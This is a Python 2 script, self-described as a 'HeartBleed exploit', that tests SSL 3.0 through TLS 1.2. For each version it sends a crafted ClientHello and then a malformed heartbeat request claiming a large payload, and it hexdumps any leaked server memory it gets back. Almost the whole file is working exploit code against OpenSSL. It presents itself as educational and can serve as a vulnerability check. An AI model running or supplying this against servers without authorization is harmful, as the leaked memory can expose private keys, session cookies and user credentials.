#!/usr/bin/python
#### MattS ####
#Checking For HeartBleed on each version of protocol from ssl3.0 - tls1.2
#Created only for educational purposes. Do not take the results as final, mistakes in my code are possible :P 
#Useful links:
#http://en.wikipedia.org/wiki/Transport_Layer_Security#TLS
#http://tools.ietf.org/html/rfc2246
#https://tools.ietf.org/html/rfc6520
#http://tools.ietf.org/html/rfc5246

import sys
import struct 
import socket
import time
import select
import re

from optparse import OptionParser


#------------------------------------Option--Parse-----------
options = OptionParser(usage='address [options]', description='HeartBleed exploit - M.S')
options.add_option('-p','--port',type='int',default=443,help='TCP port to test (default: 443)')

#------------------------------------Func--------------------

def hex2bin(x):
	return x.replace(' ','').replace('\n','').decode('hex')

def hexdump(s):
	for x in range(0,len(s),16):
		lin = [c for c in s[x:x+16]]
		hexdata = ' '.join('%02X' % ord(c) for c in lin)
		plaindata = ''.join((c if 32 <= ord(c) <= 126 else '.') for c in lin)
		print '\t %04x: %-48s %s' % (x,hexdata,plaindata)
	print

def recvall(s,length, timeout=2):
	endtime = time.time()+timeout
	rdata = ''
	remain = length
	while remain > 0:
		rtime = endtime - time.time()
		if rtime < 0:
			return None
		r,w,e = select.select([s],[],[],5)
		if s in r:
			data = s.recv(remain)
			if not data:
				return None
			rdata +=data
			remain -=len(data)
	return rdata

def recvmsg(s):
	hexDataRecived = recvall(s,5)
	if hexDataRecived is None:
		print 'EOF recived (header) - server closed connection'
		return None,None,None
	typ,ver,ln = struct.unpack('>BHH',hexDataRecived)
	pay = recvall(s,ln,10)
	if pay is None:
		print 'EOF recived (payload) - server closed connection'
		return None,None,None
	print '... recived message: type= %d, ver= %04x, len=%d' % (typ,ver,len(pay))
	return typ,ver,pay

def hitHeartBeat(s,m):
	s.send(m)
	while True:
		typ,ver,pay = recvmsg(s)
		if typ is None:
			return False
		if typ == 24:
			if len(pay) > 3:
				print hexdump(pay)
				return True
			else:
				return False
		if typ == 21:
			return False

#----------------------------------Messages-----------------

hello = '''16 03 02 00  dc 01 00 00 d8 03 02 5a
4a 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 c1
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 a1 c0 11 c0 07 c0 0c
c0 02 00 05 00 aa 00 15  00 12 aa 09 aa 14 00 11
00 08 aa aa aa aa 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 aa 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01'''

hb = '''18 03 01 00 03 01 40 00'''

tlsVer = ['0','1','2','3']
tls = {'0':'ssl3.0', '1':'tls1.0', '2':'tls1.1', '3':'tls1.2'}
#--------------------------------Main-----------------------

def main():
	opts,args = options.parse_args()
	if len(args) < 1:
		options.print_help()
		return
	tries=[]
	for t in tlsVer:
		print tls[t] + ": ---------------------------------"
		hello1 = hex2bin(hello[:7] + t + hello[8:])
		hb1 = hex2bin(hb[:7] + t + hb[8:])
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.settimeout(1)
		try:
			print 'Connecting...'
			s.connect((args[0],opts.port))
		
			print 'Sending Client Hello'
			s.send(hello1)
			
			print 'Waiting for Server Hello...'

			while True:
				typ,ver,pay = recvmsg(s)
				if typ == None:
					print 'Server closed - no handshake'
					break
				if typ == 22 and ord(pay[0]) == 0x0E:
					print 'Sending Heartbeat request'
					ch = hitHeartBeat(s,hb1)
					if ch:
						print '---InSecured'
					else:
					 	print '---Secured'
					break
		except socket.error as err:
			print err

if __name__ == "__main__":
	main()
